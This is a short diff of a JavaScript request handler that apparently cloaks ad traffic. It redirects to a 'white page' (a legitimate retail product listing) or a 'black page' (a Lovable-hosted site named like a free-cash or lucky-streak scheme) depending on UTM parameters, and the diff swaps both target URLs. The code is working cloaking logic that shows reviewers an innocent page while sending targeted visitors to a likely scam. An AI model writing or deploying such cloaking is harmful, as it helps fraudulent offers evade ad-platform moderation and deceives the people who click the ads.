@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://kitandcradle.com.au/products/we-fly-high-dress-pink-whale?pr_prod_strat=e5_desc&pr_rec_id=473266fa4&pr_rec_pid=10315975491894&pr_ref_pid=6944572080209&pr_seq=uniform";
-    const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
+    const whitePageURL = "https://www.gulahmedshop.com/collections/jewelry/products/drop-earings-ifa-er-022";
+    const blackPageURL = "https://luckystreak.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
